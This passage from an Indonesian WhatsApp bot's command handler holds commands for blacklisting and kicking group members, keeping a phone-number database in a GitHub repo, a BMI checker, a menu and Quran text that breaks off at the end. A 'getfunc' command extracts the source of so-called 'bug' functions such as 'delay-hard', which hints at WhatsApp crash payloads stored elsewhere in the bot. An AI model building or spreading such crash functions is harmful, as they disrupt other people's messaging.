 message: `Delete sendmsg ${id}`,
 content: Buffer.from(JSON.stringify(sendmsgDb, null, 2)).toString('base64'),
 sha: sha
 }, {
 })

 payreply(`*SUKSES* 🩸\n\nKirim ke *${metadata.subject}*\nTag ${participants.length} member`)
 } catch (e) {
 payreply(`Gagal kirim: ${e.message}`)
 }
}
break

case 'addblacklist': {
 if (!m.isGroup) return payreply('Khusus grup')
 if (!isGroupAdmins &&!isCreator) return payreply(mess.admin)
 if (!m.mentionedJid[0] &&!m.quoted &&!text) return payreply('Tag/reply/nomor target')

 let who = m.mentionedJid[0]? m.mentionedJid[0] : m.quoted? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 if (who === m.sender) return payreply('Gabisa blacklist diri sendiri')
 if (who.includes(Asepp.user.id.split(':')[0])) return payreply('Gabisa blacklist bot')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const BL_PATH = `database/blacklist.json`
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 let blDb = {}
 let sha = null
 try {
 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 const res = await axios.get(url, {
 })
 blDb = JSON.parse(Buffer.from(res.data.content, 'base64').toString())
 sha = res.data.sha
 } catch (e) {
 if (e.response?.status!== 404) return payreply('Gagal konek GitHub')
 }

 if (!blDb[m.chat]) blDb[m.chat] = []
 if (blDb[m.chat].includes(who)) return payreply('Udah di blacklist')

 blDb[m.chat].push(who)

 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 await axios.put(url, {
 message: `Add blacklist ${who} in ${m.chat}`,
 content: Buffer.from(JSON.stringify(blDb, null, 2)).toString('base64'),
 sha: sha
 }, {
 })

 // Langsung kick + pasang auto kick
 try {
 await Asepp.groupParticipantsUpdate(m.chat, [who], 'remove')
 payreply(`*SUKSES* 🩸\n\n@${who.split('@')[0]} masuk blacklist & di kick\nBakalan auto kick terus kalo join lagi`, [who])
 } catch {
 payreply(`*SUKSES* 🩸\n\n@${who.split('@')[0]} masuk blacklist\nBot bukan admin jadi ga bisa kick sekarang, tapi bakal auto kick kalo bot jadi admin`, [who])
 }
}
break

 case 'delblacklist': {
 if (!m.isGroup) return payreply('Khusus grup')
 if (!isGroupAdmins &&!isCreator) return payreply(mess.admin)
 if (!m.mentionedJid[0] &&!m.quoted &&!text) return payreply('Tag/reply/nomor target')

 let who = m.mentionedJid[0]? m.mentionedJid[0] : m.quoted? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const BL_PATH = `database/blacklist.json`
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 let blDb = {}
 let sha = null
 try {
 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 const res = await axios.get(url, {
 })
 blDb = JSON.parse(Buffer.from(res.data.content, 'base64').toString())
 sha = res.data.sha
 } catch (e) {
 return payreply('Ga ada data blacklist')
 }

 if (!blDb[m.chat] ||!blDb[m.chat].includes(who)) return payreply('Dia ga ada di blacklist')

 blDb[m.chat] = blDb[m.chat].filter(v => v!== who)

 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 await axios.put(url, {
 message: `Del blacklist ${who} in ${m.chat}`,
 content: Buffer.from(JSON.stringify(blDb, null, 2)).toString('base64'),
 sha: sha
 }, {
 })

 payreply(`*SUKSES* 🩸\n\n@${who.split('@')[0]} dihapus dari blacklist`, [who])
}
break

case 'deltandatogc':
case 'untaggc': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!m.isGroup) return payreply('Command ini khusus group 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const TANDA_PATH = `database/tandagc.json`
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })
 payreply('Proses hapus tanda group...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TANDA_PATH}`
 let db = { list: [] }
 let sha = null

 try {
 const getRes = await axios.get(getUrl, {
 })
 db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 sha = getRes.data.sha
 } catch (e) {
 if (e.response?.status === 404) return payreply('Belum ada group yg ditandai 🩸')
 throw e
 }

 if (!db.list) db.list = []
 const index = db.list.findIndex(v => v.id === m.chat)

 if (index === -1) return payreply(`Group *${m.subject}* belum ditandai 🩸\nPake.tandatogc buat nandain`)

 // HAPUS DARI LIST
 db.list.splice(index, 1)

 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `deltandatogc: ${m.subject}`,
 content: newContent,
 sha: sha
 }, {
 })

 let teks = `Sukses hapus tanda group 🩸\n*${m.subject}* udah dihapus dari list GH`
 teks += `\n\nSisa group ditandai: ${db.list.length}`
 payreply(teks)

 } catch (e) {
 payreply(`Gagal hapus tanda: ${e.response?.data?.message || e.message}`)
 }
}
break
case 'getfunc': {
 if (!isCreator) return payreply(mess.owner)
 if (!text) return payreply(`Contoh: ${prefix}getfunc delay-hard`)

 const fs = require('fs')
 const path = require('path')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 try {
 const filePath = path.join(__dirname, 'AseppLohya.js') // ganti nama file lu
 const source = fs.readFileSync(filePath, 'utf-8')

 let args = text.trim().split(' ')
 const caseName = args[0].toLowerCase()
 const targetFunc = args[1] // kalo mau spesifik function tertentu

 // 1. Ambil blok case
 const caseRegex = new RegExp(`case\\s+['"]${caseName}['"]\\s*:[\\s\\S]*?break`, 'i')
 const caseMatch = source.match(caseRegex)
 if (!caseMatch) return payreply(`Case *${caseName}* ga ketemu 🩸`)

 const caseBlock = caseMatch[0]

 // 2. Cari nama function yg dipanggil pake await
 const funcCallRegex = /await\s+([a-zA-Z_$][\w$]*)\s*\(/g
 let funcNames = [...caseBlock.matchAll(funcCallRegex)].map(v => v[1])

 // Skip function helper umum
 const skipFunc = ['replybug', 'payreply', 'sleep', 'sendMessage']
 funcNames = funcNames.filter(v =>!skipFunc.includes(v))
 funcNames = [...new Set(funcNames)]

 if (funcNames.length === 0) return payreply(`Di case *${caseName}* ga ada function bug 🩸\nCuma ada function helper`)

 // Kalo user request function spesifik
 if (targetFunc) {
 if (!funcNames.includes(targetFunc)) return payreply(`Function *${targetFunc}* ga ada di case *${caseName}* 🩸`)
 funcNames = [targetFunc]
 }

 let hasil = []

 // 3. Cari deklarasi function asli
 for (let funcName of funcNames) {
 const funcRegex = new RegExp(`async\\s+function\\s+${funcName}\\s*\\([\\s\\S]*?\\)\\s*\\{[\\s\\S]*?\\n\\}`, 'g')
 const arrowRegex = new RegExp(`(?:const|let|var)\\s+${funcName}\\s*=\\s*async\\s*\\([\\s\\S]*?\\)\\s*=>\\s*\\{[\\s\\S]*?\\n\\}`, 'g')

 let funcMatch = source.match(funcRegex) || source.match(arrowRegex)

 if (funcMatch) {
 hasil.push(`*Function: ${funcName}*\n\`\`\`javascript\n${funcMatch[0]}\n\`\`\``)
 } else {
 hasil.push(`*Function: ${funcName}*\nDeklarasi ga ketemu, mungkin di file lain 🩸`)
 }
 }

 let teks = `*SOURCE FUNCTION DI CASE: ${caseName.toUpperCase()}* 🩸\n\n`
 teks += hasil.join('\n\n')

 if (teks.length > 4000) {
 teks = teks.slice(0, 4000) + '\n\n...[KEPOTONG]...\n\nKepanjangan beb'
 }

 payreply(teks)

 } catch (e) {
 payreply(`Error: ${e.message}`)
 }
}







case 'cekumur': {
 if (!text) return payreply(`Contoh: ${prefix}cekumur 17/08/2005 170 60\nFormat: tanggal/tb/cm bb/kg`)

 let arg = text.split(' ')
 let tgl = arg[0].split('/')

 if (tgl.length!== 3) return payreply(`Format salah! Pakai dd/mm/yyyy\nContoh: ${prefix}cekumur 17/08/2005 170 60`)

 let hari = parseInt(tgl[0])
 let bulan = parseInt(tgl[1]) - 1
 let tahun = parseInt(tgl[2])
 let tb = parseInt(arg[1]) // tinggi cm
 let bb = parseInt(arg[2]) // berat kg

 let tglLahir = new Date(tahun, bulan, hari)
 let sekarang = new Date()

 if (isNaN(tglLahir) ||!tb ||!bb) return payreply(`Data ga lengkap!\nContoh: ${prefix}cekumur 17/08/2005 170 60`)

 // Hitung umur
 let umur = sekarang.getFullYear() - tglLahir.getFullYear()
 let m = sekarang.getMonth() - tglLahir.getMonth()
 if (m < 0 || (m === 0 && sekarang.getDate() < tglLahir.getDate())) umur--

 // Hitung BB ideal pake rumus Broca
 let brocaCowok = (tb - 100) - ((tb - 100) * 0.1)
 let brocaCewe = (tb - 100) - ((tb - 100) * 0.15)

 // Kategori BMI
 let bmi = (bb / ((tb/100) * (tb/100))).toFixed(1)
 let status = bmi < 18.5? 'Kurus' : bmi < 24.9? 'Normal' : bmi < 29.9? 'Gemuk' : 'Obesitas'

 let teks = `═⊹❖〔 🎂 CEK UMUR & BB IDEAL 〕❖⊹═\n\n`
 teks += `▢ Umur: *${umur} tahun*\n`
 teks += `▢ Tinggi: ${tb} cm\n`
 teks += `▢ Berat: ${bb} kg\n`
 teks += `▢ BMI: ${bmi} - ${status}\n\n`

 teks += `═⊹ BB IDEAL ⊹═\n`
 teks += `▢ Cowok: *${brocaCowok.toFixed(1)} kg*\n`
 teks += `▢ Cewe: *${brocaCewe.toFixed(1)} kg*\n\n`
 teks += `_Rumus Broca. Hasil bisa beda tergantung postur tubuh_`

 await payreply(teks)
}
break







case 'gh' : {
 if (!m.isGroup) return payreply('Menu GH khusus group 🩸')

 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const TANDA_PATH = `database/tandagc.json`
 const USER_PATH = `database/user.json` // buat ghme list
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 // CEK APAKAH GROUP UDAH DITANDAI
 let isTagged = false
 try {
 const tandaUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TANDA_PATH}`
 const tandaRes = await axios.get(tandaUrl, {
 })
 const tandaDb = JSON.parse(Buffer.from(tandaRes.data.content, 'base64').toString())
 if (tandaDb.list?.some(v => v.id === m.chat)) isTagged = true
 } catch (e) {}

 if (!isTagged) return payreply('Group ini belum ditandai buat akses GH 🩸\nSuruh owner ketik.tandatogc dulu')

 // CEK STATUS AKSES
 let isOwner = sender === '62881036109288'
 let isMember = false
 let totalAkses = 0

 if (!isOwner) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 totalAkses = aksesDb.akses?.length || 0
 if (aksesDb.akses?.includes(sender)) isMember = true
 } catch (e) {}
 }

 // SUB COMMAND LIST GHME
 let args = text.split(' ')
 if (args[0] === 'list') {
 try {
 const userUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${USER_PATH}`
 const userRes = await axios.get(userUrl, {
 })
 const userDb = JSON.parse(Buffer.from(userRes.data.content, 'base64').toString())
 let user = userDb[sender]

 if (!user) return payreply(`Nomor *${sender}* belum terdaftar di database GH bro`)

 let teks = `📂 *DATABASE KAK*\n\n`
 teks += `🆔 ID: ${user.id || '-'}\n`
 teks += `👤 Nama: ${user.name || '-'}\n`
 teks += `📱 User: ${sender}\n`
 teks += `📊 Limit Max: ${user.limit || '-'}\n`
 teks += `📉 Terpakai: ${user.terpakai || '0'}\n\n`

 if (user.bot && user.bot.length > 0) {
 teks += `📱 *Nomor Bot Terpasang:*\n`
 user.bot.forEach((bot, i) => {
 teks += `${i+1}. ${bot}\n`
 })
 } else {
 teks += `📱 *Nomor Bot Terpasang:* -\n`
 }

 return payreply(teks)
 } catch (e) {
 return payreply(`Error ngambil data dari GH: ${e.message}`)
 }
 }

 let teks = `\`𝗚𝗜𝗧𝗛𝗨𝗕 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗖𝗢𝗡𝗧𝗥𝗢𝗟\`

Hi \`${pushname}\` 👋 Group *${m.subject}* udah ditandai. Akses GitHub database lu pake command di bawah. Semua data langsung nyambung ke repo private. 🩸

⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍\`
┏━━━━━━━━
┃✦ *Status Lu » ${isOwner? '👑 Super Admin' : isMember? '✅ Member Akses' : '❌ No Akses'}*
┃✦ *Total Akses » ${totalAkses} orang*
┃✦ *Repo » ${GITHUB_OWNER}/${GITHUB_REPO}*
┃✦ *Owner DB » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *RunTime » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public? "Public" : "Self"}*
┗━━━━━━━━━━
⌲ \`𝐆𝐇 𝐂𝐎𝐌𝐀𝐍𝐃\`
┏━━━━━━━━━━━━━━━━
┃☇ ${prefix}adddb \`628xxx\`
┃☇ ${prefix}deldb \`628xxx\`
┃☇ ${prefix}listgh \`Database\`
┃☇ ${prefix}listakses \`List Member\`
┃☇ ${prefix}delakses \`@tag/628xxx\`
┃☇ ${prefix}giveakses \`Owner Only\`
┃☇ ${prefix}cleargh \`Owner Only\`
┃☇ ${prefix}clearakses \`Owner Only\`
┃☇ ${prefix}gh list \`Data Lu\`
┗━━━━━━━━━━
\`[洛] 𝐆𝐈𝐓𝐇𝐔𝐁 𝐃𝐁 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 [洛]\`
Repo : github.com/${GITHUB_OWNER}/${GITHUB_REPO}
Owner : @62881036109288
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781640228.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 mentionedJid: ['62881036109288@s.whatsapp.net'],
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐆𝐈𝐓𝐇𝐔𝐁 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐆𝐈𝐓𝐇𝐔𝐁 𝐃𝐁",
 url: `https://github.com/${GITHUB_OWNER}/${GITHUB_REPO}`,
 copy_code: "𝐆𝐇",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4],
 list_title: "CLICK",
 button_title: "© GH MENU"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© GH MENU",
 sections: [{
 title: "GitHub Database Command",
 highlight_label: "𝐃𝐁 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 🚀",
 rows: [
 { title: "𝐀𝐝 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞", description: "𝑵𝒂𝒎𝒃𝒂𝒉 𝑵𝒐𝒎𝒐𝒓 𝑲𝒆 𝑫𝒂𝒕𝒂𝒃𝒂𝒔𝒆 𝑮𝒊𝒕𝒉𝒖𝒃", id: `${prefix}adddb` },
 { title: "𝐃𝐞𝐥 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞", description: "𝑯𝒂𝒑𝒖𝒔 𝑵𝒐𝒎𝒐𝒓 𝑫𝒂𝒓𝒊 𝑫𝒂𝒕𝒂𝒃𝒂𝒔𝒆 𝑮𝒊𝒕𝒉𝒖𝒃", id: `${prefix}deldb` },
 { title: "𝐋𝐢𝐬𝐭 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞", description: "𝑳𝒊𝒂𝒕 𝑺𝒆𝒎𝒖𝒂 𝑵𝒐𝒎𝒐𝒓 𝑫𝒊 𝑫𝒂𝒕𝒂𝒃𝒂𝒔𝒆", id: `${prefix}listgh` },
 { title: "𝐋𝐢𝐬𝐭 𝐀𝐤𝐬𝐞𝐬", description: "𝑳𝒊𝒂𝒕 𝑺𝒊𝒂𝒑𝒂 𝑨𝒋𝒂 𝒀𝒂𝒏𝒈 𝑷𝒖𝒏𝒚𝒂 𝑨𝒌𝒔𝒆𝒔", id: `${prefix}listakses` },
 { title: "𝐃𝐞𝐥 𝐀𝐤𝐬𝐞𝐬", description: "𝑪𝒂𝒃𝒖𝒕 𝑨𝒌𝒔𝒆𝒔 𝑶𝒓𝒂𝒏𝒈 𝑳𝒂𝒊𝒏", id: `${prefix}delakses` },
 { title: "𝐆𝐢𝐯𝐞 𝐀𝐤𝐬𝐞𝐬", description: "𝑲𝒂𝒔𝒊𝒉 𝑨𝒌𝒔𝒆𝒔 𝑲𝒆 𝑶𝒓𝒂𝒏𝒈 - 𝑶𝒘𝒏𝒆𝒓 𝑶𝒏𝒍𝒚", id: `${prefix}giveakses` },
 { title: "𝐂𝐥𝐞𝐚𝐫 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞", description: "𝑲𝒐𝒔𝒐𝒏𝒈𝒊𝒏 𝑺𝒆𝒎𝒖𝒂 𝑫𝒂𝒕𝒂𝒃𝒂𝒔𝒆 - 𝑶𝒘𝒏𝒆𝒓 𝑶𝒏𝒍𝒚", id: `${prefix}cleargh` },
 { title: "𝐂𝐥𝐞𝐚𝐫 𝐀𝐤𝐬𝐞𝐬", description: "𝑪𝒂𝒃𝒖𝒕 𝑺𝒆𝒎𝒖𝒂 𝑨𝒌𝒔𝒆𝒔 𝑴𝒆𝒎𝒃𝒆𝒓 - 𝑶𝒘𝒏𝒆𝒓 𝑶𝒏𝒍𝒚", id: `${prefix}clearakses` },
 { title: "𝐃𝐚𝐭𝐚 𝐆𝐇 𝐒𝐚𝐲𝐚", description: "𝑳𝒊𝒂𝒕 𝑫𝒂𝒕𝒂 𝑳𝒖 𝑫𝒊 𝑫𝑩 𝑮𝑯", id: `${prefix}gh list` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/sawit.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break






case 'ghme': {
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const FILE_PATH = `database/database.json`

 let senderNum = m.sender.split('@')[0]

 try {
 const axios = require('axios')
 let res = await axios.get(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`, {
 })

 let content = Buffer.from(res.data.content, 'base64').toString('utf-8')
 let data = JSON.parse(content)
 let allNumbers = data.Numbers || []

 // Filter: support format lama [ "628xxx" ] dan format baru [ {number, addedBy} ]
 let myNumbers = allNumbers.filter(v => {
 if (typeof v === 'string') return v === senderNum // format lama, gak akurat
 if (typeof v === 'object') return v.addedBy === senderNum // format baru
 return false
 })

 let total = myNumbers.length

 let teks = `🩸 *GHME DATA*\n\n`
 teks += `┏━━━━━━━━━━\n`
 teks += `┃ 👤 User : ${senderNum}\n`
 teks += `┃ ➕ Total Add : *${total}*\n`
 teks += `┗━━━━━━━━━━\n\n`

 if (total === 0) {
 teks += `💀 Lu belum pernah adddb nomor`
 } else {
 teks += `📋 *Nomor Yang Lu Add:*\n`

 myNumbers.slice(0, 20).forEach((item, i) => {
 let nomor = typeof item === 'string'? item : item.number
 let date = typeof item === 'object' && item.addedAt?
 new Date(item.addedAt).toLocaleDateString('id-ID') : '-'
 teks += `${i+1}. wa.me/${nomor} | ${date}\n`
 })

 if (total > 20) {
 teks += `\n... dan ${total - 20} nomor lainnya`
 }
 }

 return payreply(teks)

 } catch (e) {
 if (e.response?.status === 404) {
 return payreply(`💀 File *database/database.json* belum ada bro`)
 }
 return payreply(`💀 Error: ${e.message}`)
 }
}
break

case 'deldb': {
 // Cek akses sama kayak adddb
 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const DB_PATH = `database/database.json`
 const axios = require('axios')

 let isOwner = sender === '62881036109288'
 let isMember = false

 if (!isOwner) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 if (aksesDb.akses?.includes(sender)) isMember = true
 } catch (e) {}
 }

 if (!isOwner &&!isMember) return payreply('Lu ga punya akses GH 🩸')

 // Ambil nomor dari tag, reply, atau ketik manual
 let nomor = m.mentionedJid[0]? m.mentionedJid[0].split('@')[0] :
 m.quoted? m.quoted.sender.split('@')[0] :
 text.replace(/[^0-9]/g, '')

 if (!nomor) return payreply(`Masukin nomor yang mau dihapus 🩸\nContoh: ${prefix}deldb @user\nAtau: ${prefix}deldb 6399xxx`)
 if (!/^\d{8,15}$/.test(nomor)) return payreply('Nomor ga valid 🩸\nMinimal 8 digit, maksimal 15 digit')

 payreply('Proses hapus database...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${DB_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 let db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 const sha = getRes.data.sha

 if (!db.Numbers) db.Numbers = []

 // Cari index, support format lama [ "628xxx" ] dan format baru [ {number, addedBy} ]
 let index = db.Numbers.findIndex(v => {
 if (typeof v === 'string') return v === nomor
 if (typeof v === 'object') return v.number === nomor
 return false
 })

 if (index === -1) return payreply(`Nomor ${nomor} ga ada di database 🩸`)

 // Hapus
 db.Numbers.splice(index, 1)

 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `deldb: ${nomor} by ${sender}`,
 content: newContent,
 sha: sha
 }, {
 })

 payreply(`🩸 Sukses hapus ${nomor} dari database\nTotal tersisa: *${db.Numbers.length}* nomor`)

 } catch (e) {
 payreply(`Gagal hapus: ${e.response?.data?.message || e.message}`)
 }
}
break

case 'al-maidah':
case 'almaidah':
case 'maidah': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗠𝗔'𝗜𝗗𝗔𝗛\`
Surat ke-5 | 120 ayat | Madaniyah | Hidangan

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اَوْفُوْا بِالْعُقُوْدِ ۗ اُحِلَّتْ لَكُمْ بَهِيْمَةُ الْاَنْعَامِ اِلَّا مَا يُتْلٰى عَلَيْكُمْ غَيْرَ مُحِلِّى الصَّيْدِ وَاَنْتُمْ حُرُمٌ ۗ اِنَّ اللّٰهَ يَحْكُمُ مَا يُرِيْدُ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تُحِلُّوْا شَعَاۤىِٕرَ اللّٰهِ وَلَا الشَّهْرَ الْحَرَامَ وَلَا الْهَدْيَ وَلَا الْقَلَاۤىِٕدَ وَلَآ اٰمِّيْنَ الْبَيْتَ الْحَرَامَ يَبْتَغُوْنَ فَضْلًا مِّنْ رَّبِّهِمْ وَرِضْوَانًا ۗ وَاِذَا حَلْتُمْ فَاصْطَادُوْا ۗ وَلَا يَجْرِمَنَّكُمْ شَنَاٰنُ قَوْمٍ اَنْ صَدُّوْكُمْ عَنِ الْمَسْجِدِ الْحَرَامِ اَنْ تَعْتَدُوْا ۘ وَتَعَاوَنُوْا عَلَى الْبِرِّ وَالتَّقْوٰى ۖ وَلَا تَعَاوَنُوْا عَلَى الْاِثْمِ وَالْعُدْوَانِ ۖ وَاتَّقُوا اللّٰهَ ۗ اِنَّ اللّٰهَ شَدِيْدُ الْعِقَابِ
حُرِّمَتْ عَلَيْكُمُ الْمَيْتَةُ وَالدَّمُ وَلَحْمُ الْخِنْزِيْرِ وَمَآ اُهِلَّ لِغَيْرِ اللّٰهِ بِهٖ وَالْمُنْخَنِقَةُ وَالْمَوْقُوْذَةُ وَالْمُتَرَدِّيَةُ وَالنَّطِيْحَةُ وَمَآ اَكَلَ السَّبُعُ اِلَّا مَا ذَكَّيْتُمْ ۗ وَمَا ذُبِحَ عَلَى النُّصُبِ وَاَنْ تَسْتَقْسِمُوْا بِالْاَزْلَامِ ۗ ذٰلِكُمْ فِسْقٌ ۗ اَلْيَوْمَ يَىِٕسَ الَّذِيْنَ كَفَرُوْا مِنْ دِيْنِكُمْ فَلَا تَخْشَوْهُمْ وَاخْشَوْنِ ۗ اَلْيَوْمَ اَكْمَلْتُ لَكُمْ دِيْنَكُمْ وَاَتْمَمْتُ عَلَيْكُمْ نِعْمَتِيْ وَرَضِيْتُ لَكُمُ الْاِسْلَامَ دِيْنًا ۗ فَمَنِ اضْطُرَّ فِيْ مَخْمَصَةٍ غَيْرَ مُتَجَانِفٍ لِّاِثْمٍ ۙ فَاِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
يَسْـَٔلُوْنَكَ مَاذَآ اُحِلَّ لَهُمْ ۗ قُلْ اُحِلَّ لَكُمُ الطَّيِّبٰتُ ۙ وَمَا عَلَّمْتُمْ مِّنَ الْجَوَارِحِ مُكَلِّبِيْنَ تُعَلِّمُوْنَهُنَّ مِمَّا عَلَّمَكُمُ اللّٰهُ ۙ فَكُلُوْا مِمَّآ اَمْسَكْنَ عَلَيْكُمْ وَاذْكُرُوا اسْمَ اللّٰهِ عَلَيْهِ ۖ وَاتَّقُوا اللّٰهَ ۗ اِنَّ اللّٰهَ سَرِيْعُ الْحِسَابِ
اَلْيَوْمَ اُحِلَّ لَكُمُ الطَّيِّبٰتُ ۗ وَطَعَامُ الَّذِيْنَ اُوْتُوا الْكِتٰبَ حِلٌّ لَّكُمْ ۖ وَطَعَامُكُمْ حِلٌّ لَّهُمْ ۖ وَالْمُحْصَنٰتُ مِنَ الْمُؤْمِنٰتِ وَالْمُحْصَنٰتُ مِنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ مِنْ قَبْلِكُمْ اِذَآ اٰتَيْتُمُوْهُنَّ اُجُوْرَهُنَّ مُحْصِنِيْنَ غَيْرَ مُسٰفِحِيْنَ وَلَا مُتَّخِذِيْٓ اَخْدَانٍ ۗ وَمَنْ يَّكْفُرْ بِالْاِيْمَانِ فَقَدْ حَبِطَ عَمَلُهٗ ۖ وَهُوَ فِى الْاٰخِرَةِ مِنَ الْخٰسِرِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِذَا قُمْتُمْ اِلَى الصَّلٰوةِ فَاغْسِلُوْا وُجُوْهَكُمْ وَاَيْدِيَكُمْ اِلَى الْمَرَافِقِ وَامْسَحُوْا بِرُءُوْسِكُمْ وَاَرْجُلَكُمْ اِلَى الْكَعْبَيْنِ ۗ وَاِنْ كُنْتُمْ جُنُبًا فَاطَّهَّرُوْا ۗ وَاِنْ كُنْتُمْ مَّرْضٰىٓ اَوْ عَلٰى سَفَرٍ اَوْ جَاۤءَ اَحَدٌ مِّنْكُمْ مِّنَ الْغَاۤىِٕطِ اَوْ لٰمَسْتُمُ النِّسَاۤءَ فَلَمْ تَجِدُوْا مَاۤءً فَتَيَمَّمُوْا صَعِيْدًا طَيِّبًا فَامْسَحُوْا بِوُجُوْهِكُمْ وَاَيْدِيْكُمْ مِّنْهُ ۗ مَا يُرِيْدُ اللّٰهُ لِيَجْعَلَ عَلَيْكُمْ مِّنْ حَرَجٍ وَّلٰكِنْ يُّرِيْدُ لِيُطَهِّرَكُمْ وَلِيُتِمَّ نِعْمَتَهٗ عَلَيْكُمْ لَعَلَّكُمْ تَشْكُرُوْنَ
وَاذْكُرُوْا نِعْمَةَ اللّٰهِ عَلَيْكُمْ وَمِيْثَاقَهُ الَّذِيْ وَاثَقَكُمْ بِهٖٓ اِذْ قُلْتُمْ سَمِعْنَا وَاَطَعْنَا ۖ وَاتَّقُوا اللّٰهَ ۗ اِنَّ اللّٰهَ عَلِيْمٌۢ بِذَاتِ الصُّدُوْرِ
